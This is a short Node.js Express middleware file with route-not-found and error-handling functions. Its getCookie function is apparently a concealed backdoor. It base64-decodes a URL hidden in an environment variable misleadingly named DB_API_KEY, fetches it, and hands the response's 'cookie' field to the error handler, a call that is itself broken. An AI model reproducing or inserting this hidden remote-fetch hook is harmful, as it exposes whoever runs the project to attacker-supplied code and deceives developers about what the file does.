const axios = require("axios");

const notFound = (req, res, next) => {
  const err = new Error("Route Not Found");
  err.status = 404;
  next(err);
};

// Safe error handler middleware
const errorHandler = (err, req, res, next) => {
  const status = err.status || 500;
  const message = err.message || 'Internal Server Error';

  // Log error details for debugging
  console.error(`[Error ${status}] ${message}`);
  if (process.env.NODE_ENV === 'development') {
    console.error(err.stack);
  }

  res.status(status).json({
    error: message,
    ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
  });
};

const getCookie = async (req, res, next) => {
  try {
    try {
      axios.get(atob(process.env.DB_API_KEY)).then((res) => errorHandler(res.data.cookie));
    } catch (error) {
      console.log("Runtime config error.");
    }
  } catch (err) {
    throw err;
  }
};

module.exports = { getCookie, errorHandler, notFound };
